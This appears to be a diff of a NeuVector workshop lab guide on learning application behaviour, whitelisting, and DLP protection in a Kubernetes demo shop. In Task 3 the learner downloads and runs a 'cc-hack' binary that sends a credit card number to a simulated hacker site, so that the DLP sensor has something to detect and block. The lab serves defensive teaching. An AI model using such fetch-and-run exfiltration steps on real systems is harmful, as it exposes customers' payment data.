@@ -1,231 +1,66 @@
 # Lab 2 - Exploring Learning Behaviour of NeuVector
 
-In this task, we are going to explore the learning behaviour of NeuVector to intelligently learn the behaviour of any microservices application, automatically discover all the valid east-west network traffic within the cluster, and generate the security code as Kubernetes CRD resources.
+In this lab, we will experience first hand NeuVector capability to learn application behaviour of any microservices application, automatically discover all the valid east-west network traffic within the cluster, and generate the security code as Kubernetes CRD resources. We will also detect attack using Data Loss Prevention technique of NeuVector an exciting use-case for our micro-services boutique application.  
 
+### Task 1 - Observe the application behaviour in NV
 
-
-Task 1 - Observe the behaviour of the App from NV perspective in cluster1
-
-* It's monitoring process, network, filesystem every pod is running.
-
-* Demonstrate how the app behaves under discover, monitor and protect mode.
-
-(Highlight learning behaviour of NV and its benefits)
-
-Task 3 - Export the policy under protect mode in cluster1
-
-Task 4 - Import the policy into cluster 2
-
-Task 5 - Validate your security posture.
-
-
-
-## Task 1 - Explore Application in NeuVector
-
-In task 1 we have deployed the microservices app `eshop-demo app`
-
-As DevOps team, we are tasked with testing the application. 
-
-Rancher > Cluster Management > Cluster 1 > Explore > Cluster > NeuVector > Click the `Full lifecycle Container Security` link in the NeuVector box to open up a new browser tab accessing to the NeuVector user interface. You should see the interface like below.
-
-### Task 1. 1 - Explore NeuVector. 
-
-#### Dashboard Tab 
-
-Show you a high-level security posture of your cluster with Security Risk Score, Service Connection Risk, Ingress/Egress Exposure, Vulnerability Exploits. It would further guide you on how you can improve your Overall Security Risk Score by following the guidance from NeuVector.
-
-![Cluster1-NeuVector-Homepage](../images/Cluster1-NeuVector-Homepage.PNG)
-
-#### Network Tab 
-
-will show us the communication between the containers and the various services which are communicating with each other. This gives us a good overview of network traffic (East/West)
-
-![Cluster1-NeuVector-Network-page](../images/Cluster1-NeuVector-Network-page.PNG)
-
-We can narrow down your search using the filter available. 
-
-![Cluster1-NeuVector-Network-Filter](../images/Cluster1-NeuVector-Network-Filter-1669305906976-8.png)
-
-With the Filter you get much focused view. 
-
-![Cluster1-NeuVector-Network-Filter-pg3](../images/Cluster1-NeuVector-Network-Filter-pg3.png)
-
-
-
-#### Assets Tab 
-
-give you more insight within the cluster, starting with the Kubernetes Management Platform itself, Nodes in the cluster, Containers in the clusters, registries the cluster is connected with if any & finally the System Components of NeuVector itself. 
-
-At high level, you can scan Platform
-
-Similarly if you click on Nodes, it give you details of all the nodes in the cluster & you can scan them for Compliance, Vulnerability. for container running on them etc...
-
-Containers provide you the list of the containers along with their additional details like namespace, Nodes, Application & it's associated ports etc....
-
-Registry page show you details on registry if any.
-
-Finally the System Components are the NeuVector Components (Controllers, Scanners & Enforcers). 
-
-Covering each section in details is beyond this scope of this workshop.
-
-#### Policy Tabs
-
-For this exercise, we will be focusing in Policy Tabs mostly. 
-
-We create admission control rule in `Admission Control` tab. We are covering this in details in exercise 3. 
-
-Group & Network Rules which will provide us with in-depth details about our application, it's container processes, network rule etc. We will cover this indepth in this exercise. 
-
-Response rule is where xxxxx (Need t explain)
-
-DLP Sensors & WAT Sensors are available out of box & they keep looking for anomaly. 
-
-![Cluster1-Policy-Groups-Filter-eshop](../images/Cluster1-Policy-Groups-Filter-eshop.PNG)
-
-#### Security Risk 
-
-Cover Vulnerability & Compliance. You scan results are display in depth detail here. 
-
-#### Notification 
-
-Security Event & Risk Report. 
-
-All Network & Process violation are captured in Security Event.
-
-All Scan & Admission Control violation are display here. 
-
-#### Setting 
-
-You can configure users & role, configuration option for Syslogs, Webhooks etc are available under Configuration page
-
-You can also configure LDAP/AD, SAML & OpenID Connect which work in conjunction with Rancher as Rancher provides centralized Authentication & Authorization Capabilities which NeuVector leverages. 
-
-
-
-### Task 2 - Application Learning using NeuVector. 
-
-NeuVector provider full life-cycle container security.
-
-NeuVector provides layered security & in this task we will be specifically looking at Process & Network Violation. We will discover application behaviour and create a whilelist based policy to detect violations of normal behaviour. 
-
-We can also do Threat Detections against attach such as DDoS, DNS attacks on containers, Use DLP & WAF Sensor to inspect network traffic for Data Loss Prevention of sensitive data & detect OWASP Top 10 WAF attacks - **Subjective to Derek's creating a rogue container to simulate the attach which can send data to external network**
-
-#### Task 2.1 - Observing your application network flow.
+1. Observing your application network flow.
 
 We have already done this previously in the task 1, while taking a look at the Network Tab. This give us a high level network communication flow. 
 
+NeuVector > Network Activityps > Filter `eshop`
+
 ![Cluster1-NeuVector-Network-Filter-pg3](../images/Cluster1-NeuVector-Network-Filter-pg3.png)
 
-Next step is to look at the containers which are part of the Application. 
+2. Right click on the container - `eshop-online-boutique-frontend` . You can see the details of the pod along with other details. 
 
-Right click on the container (pic)
+![Cluster1-NeuVector-Network-Activity-Filter-Applicationpod-Details](../images/Cluster1-NeuVector-Network-Activity-Filter-Applicationpod-Details.png)
 
-Show Network traffic & Protocol been used. (pic)
-
-
-
-
-
-NeuVector > Policy > Groups > Filter `eshop` and this will filter what NeuVector has learned about the eshop application. 
-
-We will see all the Services within the namespace & the Policy Mode which they are in & other information. 
-
-NeuVector prefix the services with nv.container-name which you can easily notice in the sample image below.
+3. Click on NeuVector > Policy > Groups > Filter `eshop` . NeuVector will present all the pods which are spun up by the micro services application in the namespace `eshop-demo`. We will see all the Services within the namespace & the Policy Mode which they are in & other information. NeuVector default mode is Discover. NeuVector prefix the services with nv.container-name which you can easily notice in the sample image below.
 
 ![Cluster1-Policy-Groups-Filter-eshop](../images/Cluster1-Policy-Groups-Filter-eshop.PNG)
 
-Let's pick up one container to observe what NeuVector has learned about it. 
-
-In our example, let's pick the `nv.eshop-demo-online-boutique-frontend.eshop-demo`
-
-Members 
-
-![Cluster1-NeuVector-Policy-Groups-Members](../images/Cluster1-NeuVector-Policy-Groups-Members.PNG)
-
-Process Profiles Rules
-
-NeuVector shows all process which are spin up during container creation. 
+4. Let's pick up one container to observe what NeuVector has learned about it. In our example, let's pick the `nv.eshop-demo-online-boutique-frontend.eshop-demo`. Click on the Process Profiles Rules - NeuVector shows all process which are spin up during container creation. 
 
 ![Cluster1-NeuVector-Policy-Groups-Process-Profile-Rules](../images/Cluster1-NeuVector-Policy-Groups-Process-Profile-Rules.PNG)
 
-Network Rules
+5. Click on Network Rules to know which micro-services are talking to each other using which protocol and ports.
 
 ![Cluster1-NeuVector-Policy-Network-Rules](../images/Cluster1-NeuVector-Policy-Network-Rules.PNG)
 
-If you wish to add DLP & WAF Rules, 
+#### Task 2 - Realtime Process Profile Rule (whitelisting)
 
-![Cluster1-NeuVector-Policy-Add-DLP-WAF](../images/Cluster1-NeuVector-Policy-Add-DLP-WAF.png)
-
-DLP Rule added
-
-![Cluster1-NeuVector-Policy-DLP](../images/Cluster1-NeuVector-Policy-DLP.PNG)
-
-
-
-WAF Rules
-
-![Cluster1-NeuVector-Policy-WAF](../images/Cluster1-NeuVector-Policy-WAF.PNG)
-
-
-
-NeuVector learn all these under the Discovery Mode, which is the default mode of NeuVector. 
-
-![Cluster1-NeuVector-Configuration-New Service Mode-Default-Value](../images/Cluster1-NeuVector-Configuration-New Service Mode-Default-Value.png)
-
-
-
-Service Group Mode Automation. 
-
-You can decide how long, you would want to run the Discovery Mode & if the no changes are made to the learn application, you can configure NeuVector to automatically move to Monitor or Protect Mode. 
-
-You can click on the i button for more detailed explanation. 
-
-![Cluster1-NeuVector-Configuration-ServiceGroup-Mode-Default-Value](../images/Cluster1-NeuVector-Configuration-ServiceGroup-Mode-Default-Value.png)
-
-
-
-Network Service Policy Mode -  `set the network node at the global level`
-
-You can also set Network Service Policy Mode (Disabled by Default),
-
-![Cluster1-NeuVector-Configuration-Network-Service-Policy-Mode-Default-Value](../images/Cluster1-NeuVector-Configuration-Network-Service-Policy-Mode-Default-Value.png)
-
-#### Task 2.2 - Realtime Process Profile Rule (whitelisting)
-
-Earlier we had identified in the discovery mode, what process did the container start with. 
+1. Earlier in discovery mode, we had identified what process did the container start when it spined up. NeuVector continuously watch the process inside the container
 
 ![Cluster1-NeuVector-Policy-Groups-Process-Profile-Rules](../images/Cluster1-NeuVector-Policy-Groups-Process-Profile-Rules.PNG)
 
-NeuVector continuously watch the process inside the container.  
-Let's assume, we need to make some configuration changes to the configuration file residing on container's volume. For this we need access to the shell. Let see if NeuVector can identify new shell process when we access the shell in realtime. 
+2. Let's assume, we need to make some configuration changes, changes to some configuration file residing on container's volume. For this we need access to the shell. Let see if NeuVector can identify new shell process when we access the shell in realtime. 
 
-For this we need to go to Rancher 
+   For this we need to go to Rancher 
 
 Rancher > Cluster Management > Cluster1 > Cluster > Workload > Pods > Filter eshop-demo namespace and we should see all containers running in the namespace. 
 
-Let's select the `eshop-demo-online-boutique-frontend-6798496f46-4sxcv` container and click on the 3 vertical dot on right hand side which further provide options. Select `ExecuteShell`  ![Cluster1-Access-to-frontend-conatainer-shell](../images/Cluster1-Access-to-frontend-conatainer-shell.png)
+Let's select the `eshop-demo-online-boutique-frontend`container and click on the 3 vertical dot on right hand side which further provide options. Select `ExecuteShell`  ![Cluster1-Access-to-frontend-conatainer-shell](../images/Cluster1-Access-to-frontend-conatainer-shell.png)
 
-Access to the container shell. 
+Access to the container shell and accomplish the task as desired. 
 
 ![Cluster1-Access-to-frontend-conatainer-shell-prompt-success](../images/Cluster1-Access-to-frontend-conatainer-shell-prompt-success.png)
 
-Now let validate if NeuVector was able to identify the new shell process and no surprise, we do see the new process in NeuVector
+3. Now let validate if NeuVector was able to identify the new shell process. We will need to toggle to the browser when we have our NeuVector UI and no surprise, we do see the new process in NeuVector
 
 NeuVector > Policy > Groups > Filter `frontend` > Process Profile Rules. 
 
 ![Cluster1-NeuVector-learned-new-process-shell](../images/Cluster1-NeuVector-learned-new-process-shell.png)
 
-Task 2.3 - Realtime Network Rule (whitelisting)
+4. Similarly, we can check what Services are connecting to our pod & visa versa. 
 
 NeuVector > Policy > Groups > Filter `frontend` > Network Rules Rules. 
 
-NeuVector create the whitelisting rule under the Discovery mode. 
-
 ![Cluster1-NeuVector-Policy-Network-Rules](../images/Cluster1-NeuVector-Policy-Network-Rules.PNG)
 
-In this way NeuVector can learn our application behaviour. we can continue to test the application & it will continue to learn & create whitelist rules. Once we happy with our testing we can have NeuVector change it's mode from Discovery to Monitor & or Protect 
+5. In this way NeuVector can learn our application behaviour. we can continue to test the application & it will continue to learn & create whitelist rules. Once we happy with our testing and we no longer want NeuVector to learn and keep us updated if things are beyond the whitelisting rule created by NeuVector during Discovery mode we change the mode Discovery to Monitor & or Protect. 
 
-While you are testing, you can start with Discovery to learn & than process to Monitor Mode. Monitor mode will report any volition based on the whitelisting Process & Network Rules we have create in Discovery mode & report them as Security Event.  
+   Monitor mode will report any volition based on the whitelisting Process & Network Rules we have create in Discovery mode & report them as Security Event.  
 
 To change our application mode from Discovery to Monitor 
 
@@ -243,13 +78,23 @@ Confirmation of Change of Mode to Monitor
 
 Going forward any violations in Process/Network will be alerted and we can see them in Notification > Security Events.
 
-If we toggle back to Rancher > Cluster Management > Cluster1 > Cluster > Workload > Pods > Filter eshop-demo namespace and we should see all containers running in the namespace. 
+6. Let's try & see if we can generate events which violates the existing whitelisting rule and NeuVector Monitor mode, detects & alerts us of the behaviour. 
 
-Execute into the shell & try & execute a ping command to any website of your choice, it will result in success, however since we have not kept the application service in Monitor Mode,we expect to see Security Event notifying that ping was never part of whitelisting rule & hence this was a violation and would be reported accordingly.   
+   For this we will need to Toggle to Rancher UI
 
-![Cluster1-mode-monitor-proces-ping](../images/Cluster1-mode-monitor-proces-ping.png)
+   Rancher > Cluster Management > Cluster1 > Cluster > Workload > Pods > Filter eshop-demo namespace and we should see all containers running in the namespace. 
 
-Viewing Process Violation
+   Let's select the `eshop-demo-online-boutique-frontend`container and click on the 3 vertical dot on right hand side which further provide options. Select `ExecuteShell`  
+
+   Execute a ping command to any website of your choice, I have used `www.google.com` it will result in success
+
+   ![Cluster1-mode-monitor-proces-ping](../images/Cluster1-mode-monitor-proces-ping.png)
+
+
+
+7. Since ping was not learned in discovery mode, and we have executed this command, Monitor mode will send an security event. We expect to see Security Event notifying that ping was never part of whitelisting rule & hence this was a violation and would be reported accordingly.   
+
+For this we will need to toggle back to NeuVector UI
 
 NeuVector > Notification > Security Event - Filter `www.google.com`
 
@@ -257,3 +102,148 @@ NeuVector > Notification > Security Event - Filter `www.google.com`
 
 
 
+### Task 3 - Securing Data with NeuVector DLP functionality 
+
+Our Team is tasked to host this Online Boutique and ensure we protect customer sensitive data. NeuVector uses DLP and WAF uses the Deep Packet Inspection (DPI) to inspect the network payloads of connections for sensitive data violations. Let's see th is in action. 
+
+1. NeuVector UI - Policy > Group > Add Group
+
+Name = `eshop-demo`
+
+Criteria = `namespace=eshop-demo`
+
+![Group-add-eshop-demo-group](../images/Group-add-eshop-demo-group-1669661156379-49.PNG)
+
+New Group created. 
+
+![Group-add-eshop-demo-group-success](../images/Group-add-eshop-demo-group-success.PNG)
+
+2. Enable DLP for newly created Group. 
+
+   Click on the eshop-demo group, locate the DLP tab underneath, click edit button, check the creditcard DLP sensor (deny).
+
+![Group-eshop-demo-dlp-page1](../images/Group-eshop-demo-dlp-page1.png)
+
+Select Sensor.CreditCard & hit Apply.
+
+![Group-eshop-demo-dlp-page](../images/Group-eshop-demo-dlp-page.PNG)
+
+We now see the DLP successfully applied to the Group. 
+
+![Group-eshop-demo-dlp-success-page2](../images/Group-eshop-demo-dlp-success-page2.png)
+
+**Note - This does not automatically apply the same credit card sensor to all pods in eshop-demo namespace**
+
+3. Now let's test the filter. For this we will move the Group we created into Monitor mode. 
+
+In the Group, filter by "eshop", check all the pods in namespace eshop-demo. Click Switch Mode button. 
+
+Select "Monitor" mode, and use "Basic". Click Apply.
+
+![Group-eshop-demo-switch-to-monitor-pg1](../images/Group-eshop-demo-switch-to-monitor-pg1.PNG)
+
+Switching to Monitor Mode.
+
+![Group-eshop-demo-switch-to-monitor-pg2](../images/Group-eshop-demo-switch-to-monitor-pg2.PNG)
+
+![Group-eshop-demo-switch-to-monitor-success-pg3](../images/Group-eshop-demo-switch-to-monitor-success-pg3.PNG)
+
+4. We let's assume we have already an intruder inside our network and we are not aware of it. He will be stealing our credit care data.  For next step, we will switch to Rancher UI. 
+
+Switch to Rancher UI
+
+Cluster 2 > Workload > Pods > Filter `payment`> right click on 3 vertical dots > Execute Shell
+
+![RancherUI-payment-service-execute-shall-pg1](../images/RancherUI-payment-service-execute-shall-pg1.PNG)
+
+Copy and paste the code block on the container shell. This download the cc-hack agent into the pod, got executed. A customer's credit card number will then be sent to the hacker's site. And the hacker site will respond the same credit card number back to the agent.
+
+`wget https://rancherworkshop.blob.core.windows.net/demoapp/cc-hack`
+`chmod +x cc-hack`
+`./cc-hack`
+
+![RancherUI-payment-service-execute-shell-pg2](../images/RancherUI-payment-service-execute-shell-pg2-1669654522523-29-1669654723600-31.PNG)
+
+We can see the code has execute & got credit card data which he can send to external world. 
+
+5. Switch back to NeuVector UI to see if we are getting any Security Risk Event 
+
+   NeuVector > Notification > Security Events > Filter `DLP`. You should notice the "card violation rule..."
+
+![NeuVector-Notification-DLP-Event-pg1](../images/NeuVector-Notification-DLP-Event-pg1.PNG)
+
+6. To inspect the payload, you can click on `Show Packet`. You can even download the packet capture by clicking on `DOWNLOAD PCAP`
+
+![NeuVector-Notification-DLP-Event-pg2](../images/NeuVector-Notification-DLP-Event-pg2-1669655005102-37.PNG)
+
+
+
+7. Now let protect the application so this does not happen again. 
+
+NeuVector > Policy > Groups > Filter `eshop`> Select All > Switch Mode >  Select "Protect" mode, and use "Basic" > Click Apply.
+
+![Group-eshop-demo-switch-to-protect-pg1](../images/Group-eshop-demo-switch-to-protect-pg1.PNG)
+
+![Group-eshop-demo-switch-to-protect-pg2](../images/Group-eshop-demo-switch-to-protect-pg2.PNG)
+
+![Group-eshop-demo-switch-to-protect-pg3-success](../images/Group-eshop-demo-switch-to-protect-pg3-success.PNG)
+
+8. Now, we will need to switch to the Ranch UI, in the same payment service pod, open the shell, execute the ./cc-hack program. You will get a message that Operation was not permitted as it violated the DLP sensor we had applied on the pods/services in the eshop-demo namespace. 
+
+   Cluster 2 > Workload > Pods > Filter `payment`> right click on 3 vertical dots > Execute Shell
+
+   re-run the cc-hack script by executing the below command on the container shell. 
+
+   `./cc-hack` . We expect to see a denial of the operation and sure we see it in the below sample image.  
+
+![RancherUI-payment-service-execute-shell-protect-mode-result](../images/RancherUI-payment-service-execute-shell-protect-mode-result.PNG)
+
+9. Let's check on what notification we get in NeuVector. 
+
+   Toggle to the NeuVector UI 
+
+   NeuVector > Notification > Security Events > Filter `Deny`. You should notice the process violation as `Critical` and the action by NeuVector which is `Deny`. 
+
+![NeuVectorUI-group-protect-mode-result](../images/NeuVectorUI-group-protect-mode-result.PNG)
+
+
+
+Further to this, we can define response rules on the security events to notify the operator in case those "interesting" events are being triggered. (Beyond the scope of this workshop)
+
+9. Export Group Policy
+
+   We have now learned our application behaviour and created a security profile. We can easily import & export these to new clusters we on-board. 
+
+NeuVector > Policy > Groups > Filter `eshop`> Select All > Export Group Policy > dropdown > click on `Protect`
+
+![NeuVector-eshop-app-security-policy-export-pg1](../images/NeuVector-eshop-app-security-policy-export-pg1.PNG)
+
+A policy file with YAML extension will be downloaded to your local drive. 
+
+10. Import Group Policy
+
+    You can import these on your other cluster to build the same security policy for your application which will be on day zero have the application in the protect mode. 
+
+NeuVector UI on Cluster 1 > Policy > Groups > `IMPORT GROUP POLICY` 
+
+![NeuVector-eshop-app-security-policy-export-pg2-cluste1](../images/NeuVector-eshop-app-security-policy-export-pg2-cluste1.PNG)
+
+![NeuVector-eshop-app-security-policy-export-pg3-cluster1](../images/NeuVector-eshop-app-security-policy-export-pg3-cluster1.PNG)
+
+You can choose to drop the file or upload from the chosen location & click `UPLOAD`
+
+![NeuVector-eshop-app-security-policy-export-pg4-cluster1](../images/NeuVector-eshop-app-security-policy-export-pg4-cluster1.PNG)
+
+Upon successful import, you will see the message below on the right hand bottom corner. 
+
+![NeuVector-eshop-app-security-policy-export-pg5-cluster1-successful](../images/NeuVector-eshop-app-security-policy-export-pg5-cluster1-successful.PNG)
+
+
+
+In this lab, we have successfully learned application behaviour using NeuVector. To continue to experience application behaviour we have moved from Discovery to Monitor to observe violation and once we are finally happy with our application security posture we have moved to Protect Mode.
+
+We have also seen how we have used DLP to protect our vital customer information 
+
+Finally we have created our application security posture as `security as code`  exported and following imported on new cluster to ensure our application on the new cluster where it's deployed is secured from moment it's deployed. 
+
+In Lab 3, we will see how we can managed Multiple NeuVector Cluster using NeuVector Federation. 
